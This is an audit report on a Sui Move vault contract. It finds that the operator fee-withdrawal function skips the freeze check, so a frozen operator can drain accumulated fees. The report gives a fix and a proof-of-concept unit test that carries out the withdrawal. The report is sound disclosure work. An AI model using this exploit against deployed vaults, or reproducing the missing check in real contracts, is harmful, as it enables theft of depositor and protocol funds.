# Audit Report

## Title
Operator Freeze Bypass in Fee Withdrawal Function

## Summary
The `retrieve_deposit_withdraw_fee_operator` function allows operators to withdraw accumulated deposit/withdrawal fees without verifying their frozen status, completely bypassing the operator freeze security mechanism. A frozen operator can steal all vault fees even after administrative freeze action.

## Finding Description

The vulnerability exists in the `retrieve_deposit_withdraw_fee_operator` function which lacks operator freeze validation. [1](#0-0) 

**Root Cause**: This function only requires `&OperatorCap` but does NOT take the `&Operation` parameter. Without access to the `Operation` shared object, the function cannot call `assert_operator_not_freezed` to verify the operator's frozen status.

**Comparison with Protected Functions**: All legitimate operator functions properly check freeze status. For example, `execute_deposit` and `batch_execute_deposit` both take the `Operation` parameter and call the validation: [2](#0-1) [3](#0-2) 

Similarly, reward manager functions check freeze status: [4](#0-3) 

The freeze check implementation requires the `Operation` object to access the `freezed_operators` mapping: [5](#0-4) [6](#0-5) 

**Why Protections Fail**: The underlying `retrieve_deposit_withdraw_fee` implementation only validates vault version and status, with no awareness of operator freeze state: [7](#0-6) 

## Impact Explanation

**Direct Fund Impact**: A malicious or compromised operator can steal all accumulated deposit and withdrawal fees from the vault. The amount depends on vault activity but could be substantial for active vaults with significant transaction volume.

**Security Integrity Breach**: The operator freeze mechanism is a critical security control designed to prevent malicious operators from causing further damage once detected. This bypass completely undermines that protection for fee withdrawal operations.

**Affected Parties**:
- Vault depositors whose fees should be managed by protocol
- Protocol treasury expecting to collect legitimate fee revenue  
- Admin who loses ability to prevent fee theft upon detecting malicious behavior

**Severity**: HIGH - Complete bypass of a critical security control with direct theft of accumulated funds.

## Likelihood Explanation

**Attacker Capabilities**: Requires only normal operator privileges (possession of `OperatorCap`). No privilege escalation or complex setup needed.

**Attack Complexity**: Minimal - single function call with two parameters (vault reference and withdrawal amount).

**Feasible Scenario**:
1. Admin detects operator causing losses or suspicious activity
2. Admin submits transaction calling `set_operator_freezed(operation, op_cap_id, true)`
3. Operator (either anticipating detection or continuously malicious) submits transaction calling `retrieve_deposit_withdraw_fee_operator`
4. Due to Sui's consensus ordering, operator's transaction may execute first
5. Operator successfully extracts all fees before freeze takes effect

**Probability Assessment**: HIGH - The exploitation requires only that the operator submit a fee withdrawal transaction before or concurrent with the admin's freeze transaction. This is trivially achievable and does not require sophisticated timing attacks.

## Recommendation

Add the `operation: &Operation` parameter to `retrieve_deposit_withdraw_fee_operator` and call `assert_operator_not_freezed` before processing:

```move
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault::assert_operator_not_freezed(operation, cap);
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

## Proof of Concept

```move
#[test]
// [TEST-CASE: Frozen operator can still retrieve fees - VULNERABILITY]
public fun test_frozen_operator_can_retrieve_fees() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());

    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut s);

    let sui_asset_type = type_name::get<SUI_TEST_COIN>().into_string();

    // Setup oracle with SUI price = 2 USD
    s.next_tx(OWNER);
    {
        let mut oracle_config = s.take_shared<OracleConfig>();
        vault_oracle::set_aggregator(&mut oracle_config, &clock, sui_asset_type, 9, MOCK_AGGREGATOR_SUI);
        clock::set_for_testing(&mut clock, 1000);
        vault_oracle::set_current_price(&mut oracle_config, &clock, sui_asset_type, 2 * ORACLE_DECIMALS);
        test_scenario::return_shared(oracle_config);
    };

    // Set deposit fee to accumulate fees
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        vault_manage::set_deposit_fee(&admin_cap, &mut vault, 100); // 1% fee
        test_scenario::return_shared(vault);
        s.return_to_sender(admin_cap);
    };

    // User deposits to accumulate fees
    s.next_tx(OWNER);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(1_000_000_000, s.ctx());
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        let (_request_id, receipt, coin) = user_entry::deposit(
            &mut vault, &mut reward_manager, coin, 1_000_000_000, 
            1_980_000_000, option::none(), &clock, s.ctx()
        );
        transfer::public_transfer(coin, OWNER);
        transfer::public_transfer(receipt, OWNER);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };

    // Execute deposit to finalize fees
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let config = s.take_shared<OracleConfig>();
        vault::update_free_principal_value(&mut vault, &config, &clock);
        vault.execute_deposit(&clock, &config, 0, 2_000_000_000);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
    };

    // Verify fees accumulated (10M units = 0.01 SUI with 1% fee on 1 SUI deposit)
    s.next_tx(OWNER);
    {
        let vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        assert!(vault.deposit_withdraw_fee_collected() == 10_000_000);
        test_scenario::return_shared(vault);
    };

    // Admin freezes operator
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut operation = s.take_shared<Operation>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        vault_manage::set_operator_freezed(&admin_cap, &mut operation, operator_cap.operator_id(), true);
        
        // Verify operator is frozen
        assert!(vault::operator_freezed(&operation, operator_cap.operator_id()));
        
        test_scenario::return_shared(operation);
        s.return_to_sender(operator_cap);
        s.return_to_sender(admin_cap);
    };

    // VULNERABILITY: Frozen operator can still retrieve fees
    s.next_tx(OWNER);
    {
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        
        // This should fail but doesn't - frozen operator withdraws all fees
        let fee_retrieved = vault_manage::retrieve_deposit_withdraw_fee_operator(
            &operator_cap, &mut vault, 10_000_000
        );
        assert!(fee_retrieved.value() == 10_000_000); // Successfully stole all fees!
        
        test_scenario::return_shared(vault);
        s.return_to_sender(operator_cap);
        fee_retrieved.destroy_for_testing();
    };

    // Verify fees were stolen
    s.next_tx(OWNER);
    {
        let vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        assert!(vault.deposit_withdraw_fee_collected() == 0); // All fees gone
        test_scenario::return_shared(vault);
    };

    clock.destroy_for_testing();
    s.end();
}
```

This PoC demonstrates that a frozen operator can successfully withdraw all accumulated fees, completely bypassing the freeze security mechanism.

### Citations

**File:** volo-vault/sources/manage.move (L150-156)
```text
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    _: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

**File:** volo-vault/sources/operation.move (L381-391)
```text
public fun execute_deposit<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    reward_manager: &mut RewardManager<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_id: u64,
    max_shares_received: u256,
) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L406-416)
```text
public fun batch_execute_deposit<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    reward_manager: &mut RewardManager<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_ids: vector<u64>,
    max_shares_received: vector<u256>,
) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/reward_manager.move (L235-241)
```text
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    with_buffer: bool, // If true, create a new reward buffer distribution for the reward type
) {
    self.check_version();
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/volo_vault.move (L88-92)
```text
// Operation operation
public struct Operation has key, store {
    id: UID,
    freezed_operators: Table<address, bool>,
}
```

**File:** volo-vault/sources/volo_vault.move (L380-384)
```text
public(package) fun assert_operator_not_freezed(operation: &Operation, cap: &OperatorCap) {
    let cap_id = cap.operator_id();
    // If the operator has ever been freezed, it will be in the freezed_operator map, check its value
    // If the operator has never been freezed, no error will be emitted
    assert!(!operator_freezed(operation, cap_id), ERR_OPERATOR_FREEZED);
```

**File:** volo-vault/sources/volo_vault.move (L1544-1557)
```text
public(package) fun retrieve_deposit_withdraw_fee<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    self.check_version();
    self.assert_normal();

    emit(DepositWithdrawFeeRetrieved {
        vault_id: self.vault_id(),
        amount: amount,
    });

    self.deposit_withdraw_fee_collected.split(amount)
}
```
